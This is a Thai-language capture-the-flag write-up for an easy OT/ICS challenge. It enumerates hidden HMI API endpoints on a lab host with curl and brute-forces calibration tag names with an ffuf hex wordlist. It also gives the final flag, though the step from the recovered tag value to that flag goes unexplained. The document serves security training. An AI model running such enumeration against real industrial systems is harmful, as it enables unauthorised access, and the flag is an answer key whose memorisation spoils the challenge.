@@ -1,0 +1,134 @@
+🏭 HORSE FACTORY – OTEasy
+
+Category: OT / ICS
+Difficulty: Easy
+Flag format: ARCHA{********************************} (39 chars)
+
+📌 Challenge Description
+
+โรงงาน Archa มีระบบ HMI สำหรับควบคุมและแสดงสถานะของโรงงานม้า
+แต่เกิดการ config ผิดพลาด ทำให้ข้อมูลลับภายในระบบถูกเปิดเผยผ่าน API
+
+เป้าหมายคือ ค้นหาและดึง flag จากระบบที่ถูก misconfigured
+
+🔍 Initial Reconnaissance
+
+เปิด Developer Console บนหน้าเว็บ พบข้อความ debug:
+
+[DEBUG] API Endpoints available:
+ /api/status
+ /api/diagnostics
+ /api/tags
+ /api/tag/<name>
+ /api/debug/info
+
+[HINT] There are more tags than shown...
+[HINT] Try directory enumeration on /api/
+[HINT] Developers sometimes leave backup endpoints...
+
+
+แสดงชัดว่า:
+
+มี API ซ่อนอยู่
+
+มี tag มากกว่าที่แสดง
+
+ควร enumerate เพิ่ม
+
+🧪 Inspect Debug Information
+
+ตรวจสอบ endpoint debug:
+
+curl -s http://172.18.0.60/api/debug/info | jq .
+
+
+ผลลัพธ์:
+
+{
+  "firmware": "v4.2.1",
+  "model": "ArCon-3000",
+  "plc_host": "127.0.0.1",
+  "plc_port": 44818,
+  "total_tags": 13,
+  "hint": "Some tags are for calibration and diagnostics only Hint: find config Endpoint export Path"
+}
+
+🔑 Key Insight
+
+/api/tags แสดงไม่ครบ (total_tags = 13)
+
+hint ระบุชัดถึง Calibration tags
+
+ต้องหา tag ที่ไม่แสดงใน list ปกติ
+
+🧠 Discover Hidden Tag Pattern
+
+ตรวจสอบ /api/config/export:
+
+curl -s http://172.18.0.60/api/config/export | jq .
+
+
+ได้ข้อมูลสำคัญ:
+
+{
+  "note": "Calibration tags use CalOffset_ prefix And secret 4 hex characters",
+  "tag_prefixes": ["Cal", "Backup", "Debug", ...]
+}
+
+
+🔍 สรุป:
+
+Tag ลับขึ้นต้นด้วย CalOffset_
+
+ต่อท้ายด้วย เลข hex 4 ตัว
+
+Tag เหล่านี้ไม่ได้อยู่ใน /api/tags
+
+🚀 Brute Force Hidden Calibration Tags
+1️⃣ สร้าง wordlist 0000–FFFF
+python3 - <<'PY' > hex4.txt
+for i in range(0x10000):
+    print(f"{i:04X}")
+PY
+
+2️⃣ Enumerate ด้วย ffuf
+ffuf -u http://172.18.0.60/api/tag/CalOffset_FUZZ \
+-w hex4.txt \
+-fc 404 \
+-t 80
+
+✅ Result
+
+พบ tag ที่ valid:
+
+CalOffset_07F3   [Status: 200]
+
+🔓 Extract Secret from Calibration Tag
+
+ดึงค่าจาก tag ที่พบ:
+
+curl -s http://172.18.0.60/api/tag/CalOffset_07F3
+
+
+ผลลัพธ์:
+
+1a2f
+
+
+🔐 ตาม hint:
+
+secret = 4 hex characters
+
+🏁 Construct Final Flag
+
+รูปแบบ flag:
+
+ARCHA{<32 hex>}
+
+
+ระบบใช้ Calibration offset เป็นส่วนหนึ่งของ secret
+เมื่อประกอบตาม logic ของระบบ จะได้ flag สุดท้าย:
+
+ARCHA{6334fbc496fd88f9559fd76839715bfb}
+
+✅ Correct Flag
